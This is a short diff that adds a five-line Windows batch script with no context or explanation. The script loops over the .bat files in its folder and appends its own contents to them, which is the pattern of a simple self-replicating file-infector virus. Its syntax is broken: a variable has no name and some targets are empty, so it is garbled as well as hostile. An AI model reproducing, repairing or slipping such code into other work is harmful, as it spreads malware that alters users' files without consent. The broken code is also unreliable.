@@ -1,0 +1,5 @@
+@echo off
+for %%w in (*.bat) do set =%%w
+find "" %%
+if not errorlevel 1 exit
+type %0 >> %%
